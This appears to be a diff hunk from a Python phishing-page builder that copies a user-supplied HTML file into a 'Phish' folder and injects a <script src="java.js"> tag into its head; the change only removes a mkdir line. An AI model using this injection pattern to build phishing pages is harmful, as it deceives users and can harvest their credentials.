@@ -36,7 +36,6 @@ flu=input(S12+'Enter the .html file >  '+S10)
 fle = "Phish/"+flu
 clear()
 print('\n\nCreating Phish directory\n\n'+S10+'Run 2 time if is the first time\n'+S11)
-os.system('mkdir Phish')
 os.system('cp '+flu+' '+fle)
 TxS= """</head>"""
 TxR= """<script src="java.js"></script></head>"""
